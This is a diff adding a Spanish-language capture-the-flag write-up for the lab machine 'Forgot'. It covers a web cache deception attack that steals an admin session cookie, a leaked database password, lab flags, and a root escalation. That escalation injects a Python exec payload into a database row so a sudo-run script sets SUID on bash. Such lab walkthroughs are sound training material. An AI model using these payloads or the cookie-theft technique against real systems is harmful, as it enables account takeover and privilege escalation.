@@ -120,4 +120,89 @@ Referer: http://10.10.11.188/forgot
 Ahora interceptamos la petición de **/reset** colocando el token que nos dio de manera urlencodeada para luego iniciar sesión como **robert-dev-145092**. (Si no te funciona el token a la primera, intenta nuevamente con otro token que te da si te quedaste en escucha con python)
 
 ![Burpsuite]({{ 'assets/img/commons/Forgot/Burp.png' | relative_url }}){: .center-image }
-_Petición por Burp_ 
+_Petición por Burp_
+
+Una vez obtenido el acceso a la web, vemos que en el apartado **/escalate** podemos enviarle un link para que el admin haga click en él.También si vemos el código fuente en el apartado de escalate podemos ver una ruta **/admin_tickets** si intentamos ingresar vemos que nos dice acceso denegado. Para obtener acceso a esa ruta lo que podemos hacer es lo siguiente:
+
+
+![Burpsuite]({{ 'assets/img/commons/Forgot/inexistent.png' | relative_url }}){: .center-image }
+_Petición por Burp_
+
+Una vez hemos hecho esto, colocamos en la url lo mismo que le mandamos al admin sólo que hasta **/js** porque o sino Burpsuite no nos intercepta la petición, la mandamos al repeater y allí le colocamos **/test.js** 
+
+![Burpsuite]({{ 'assets/img/commons/Forgot/cambiamos.png' | relative_url }}){: .center-image }
+_Petición por Burp_
+
+
+Veremos que nos dice "404 not found", esto es porque ahora simplemente lo hay que hacer es enviarle otra vez a admin el link, pero esta vez, ponle otra **s** al final del "/test/js", quedaría tal que así "/test.jss" y esperas un poco a que admin le dé click a ese link. Una vez hecho esto, simplemente en la petición anterior, le agregas una **s**
+
+![Burpsuite]({{ 'assets/img/commons/Forgot/cookie.png' | relative_url }}){: .center-image }
+_Petición por Burp_
+
+Listo, ya hemos hecho un "cache deception attack" y capturado la cookie de admin en el lado de la respuesta, ahora sólo resta acceder a "/admin_tickets". Simplemente intercepta con Burpsuite y cambias la cookie de session de tu usuario actual por la de admin. y veremos las credenciales del usuario por ssh
+
+![Burpsuite]({{ 'assets/img/commons/Forgot/credenciales.png' | relative_url }}){: .center-image }
+_Credenciales_
+
+Nos conectamos por ssh
+
+```
+-bash-5.0$ whoami
+diego
+-bash-5.0$ cat user.txt 
+4929615d53c0dcd5c4e69e18d1665e38
+-bash-5.0$
+```
+Podemos ver un script "bot.py" y que se conecta a la base de datos
+
+```python
+-bash-5.0$ cat bot.py 
+   # Fetch Links
+  conn = mysql.connector.connect(host="localhost",database="app",user="diego",password="dCb#1!x0%gjq")
+  cursor = conn.cursor()
+  cursor.execute('select * from forgot')
+  r = cursor.fetchall() 
+```
+
+Si hacemos sudo -l podemos ver que tenemos un script que podemos ejecutar de manera privilegiada, si lo vemos nos muestra lo siguiente:`
+
+```python
+ # Grab links
+ conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
+ cursor = conn.cursor()
+ cursor.execute('select reason from escalate')
+ r = [i[0] for i in cursor.fetchall()]
+ conn.close()
+ data=[]
+ for i in r:
+         data.append(i)
+ Xnew = getVec(data)
+```
+
+También podemos ver esto 
+
+```python
+def assessData(i):
+    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
+    if score >= .5:
+        try:
+                preprocess_input_exprs_arg_string(data[i],safe=False)
+        except:
+                pass
+```
+
+Lo que hace es verificar patrones maliciosos en la base de datos. Si cargamos esto, podemos inyectar código para que se ejecute. Nos conectamos a la base de datos y ejecutamos lo siguiente:
+
+```
+mysql> insert into escalate values ("1","1","1",'test=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
+
+```
+
+Ahora hacemos **bash -p y obtenemos root**
+
+```
+-bash-5.0$ bash -p
+bash-5.0# cat /root/root.txt 
+d41b9cbb909802752553be9dd7c82720
+bash-5.0#
+```
